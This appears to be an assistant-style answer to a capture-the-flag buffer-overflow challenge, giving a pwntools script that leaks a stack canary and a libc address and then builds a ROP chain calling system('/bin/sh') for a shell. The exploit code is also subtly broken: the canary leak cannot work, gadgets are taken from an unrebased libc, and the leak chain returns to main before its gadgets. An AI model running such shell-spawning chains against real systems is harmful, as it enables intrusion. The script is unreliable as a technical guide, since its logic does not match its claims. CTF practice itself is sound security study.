To solve this challenge using `pwntools`, we need to exploit the buffer overflow vulnerability in the `hello` function. The goal is to bypass the stack canary and control the instruction pointer (RIP) to execute arbitrary code or call system functions like `system("/bin/sh")`.

### Steps to Solve the Challenge

1. **Identify the Vulnerability**: The `hello` function reads up to 256 bytes into a 24-byte buffer (`buf`), causing a buffer overflow.
2. **Bypass Stack Canary**: We need to leak the stack canary to bypass the stack protection.
3. **Control RIP**: Once we have the canary, we can overwrite the saved RIP to control the execution flow.
4. **Find Useful Gadgets**: Use ROP gadgets to call `system("/bin/sh")`.

### Code Implementation

```python
from pwn import *

# Set up the process and context
binary = './rop'
elf = ELF(binary)
libc = ELF('/path/to/libc.so.6')  # Replace with the actual path to the libc file
context.binary = binary

# Start the process
p = process(binary)

# Function to send data and receive response
def send_data(data):
    p.sendline(data)
    return p.recv()

# Step 1: Leak the stack canary
log.info("Leaking the stack canary...")

# Send a payload to overflow the buffer and leak the canary
payload = b'A' * 24  # Fill the buffer
payload += b'B' * 8  # Overwrite the saved RBP
payload += p64(0xdeadbeef)  # Placeholder for the canary

send_data(payload)
response = send_data('no')

# Extract the canary from the response
canary = u64(response[:8])
log.success(f"Canary: {hex(canary)}")

# Step 2: Control RIP and find useful gadgets
log.info("Finding useful gadgets...")

# Find the offset to the return address
offset = cyclic_find(0x61616161)  # Adjust this based on the cyclic pattern used

# Find the gadgets
pop_rdi_ret = next(libc.search(asm('pop rdi; ret')))
ret = next(libc.search(asm('ret')))

# Step 3: Construct the ROP chain
log.info("Constructing the ROP chain...")

# Calculate the base address of libc
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

# First payload to leak the address of puts
payload = b'A' * 24
payload += p64(canary)
payload += b'B' * 8  # Overwrite the saved RBP
payload += p64(main)  # Return to main to avoid crashing
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

send_data(payload)
send_data('no')

# Receive the leaked address of puts
leaked_puts = u64(send_data('').strip().ljust(8, b'\x00'))
log.success(f"Leaked puts: {hex(leaked_puts)}")

# Calculate the base address of libc
libc_base = leaked_puts - libc.symbols['puts']
log.success(f"Libc base: {hex(libc_base)}")

# Step 4: Call system("/bin/sh")
log.info("Calling system('/bin/sh')...")

# Addresses of system and "/bin/sh"
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

# Construct the final payload
payload = b'A' * 24
payload += p64(canary)
payload += b'B' * 8  # Overwrite the saved RBP
payload += p64(ret)  # Align the stack
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

send_data(payload)
send_data('yes')

# Interact with the shell
p.interactive()
```

### Explanation

1. **Leak the Stack Canary**:
   - We send a payload to overflow the buffer and overwrite the saved RBP with a known value.
   - We then read the response to extract the canary.

2. **Find Useful Gadgets**:
   - We use `ROPgadget` to find gadgets like `pop rdi; ret` and `ret` to help us construct the ROP chain.

3. **Leak the Address of `puts`**:
   - We use the `puts` function to leak the address of `puts` in the GOT.
   - This allows us to calculate the base address of the libc.

4. **Call `system("/bin/sh")`**:
   - We construct the final payload to call `system("/bin/sh")` using the calculated addresses and gadgets.

### Notes
- Adjust the paths and offsets as necessary based on the specific environment and binary.
- Ensure that the libc file matches the one used by the binary.
- The `cyclic_find` function is used to find the exact offset to the return address. You may need to adjust the cyclic pattern if it differs.

This should give you a good starting point to solve the challenge. Good luck!
